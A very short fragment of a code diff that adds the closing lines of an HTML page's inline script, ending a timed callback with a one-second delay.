+        }, 1000);
+      }
+    </script>
   </body>
 </html>
